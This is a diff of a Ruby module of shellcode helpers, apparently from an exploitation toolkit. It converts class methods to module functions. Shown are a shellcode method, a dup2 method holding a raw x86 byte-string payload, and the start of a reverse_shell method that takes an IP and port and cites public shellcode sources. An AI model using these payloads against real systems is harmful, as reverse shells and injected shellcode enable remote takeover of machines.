@@ -2,7 +2,9 @@
 require "socket"
 
 module Shellcode
-  def self.shellcode(arch)
+  
+  module_function
+  def shellcode(arch)
     case arch
     when :x86
       # http://inaz2.hatenablog.com/entry/2014/03/13/013056
@@ -16,7 +18,7 @@ module Shellcode
     end
   end
 
-  def self.dup2(arch, newfd = 3)
+  def dup2(arch, newfd = 3)
     case arch
     when :x86
       "\x31\xff\x6a\x3f\x58\x6a#{newfd.chr}\x5b\x89\xf9\xcd\x80\x47\x83\xff\x03\x75\xf0"
@@ -25,7 +27,7 @@ module Shellcode
     end
   end
 
-  def self.reverse_shell(arch, ip, port)
+  def reverse_shell(arch, ip, port)
     case arch
     when :x86
       # http://shell-storm.org/shellcode/files/shellcode-883.php
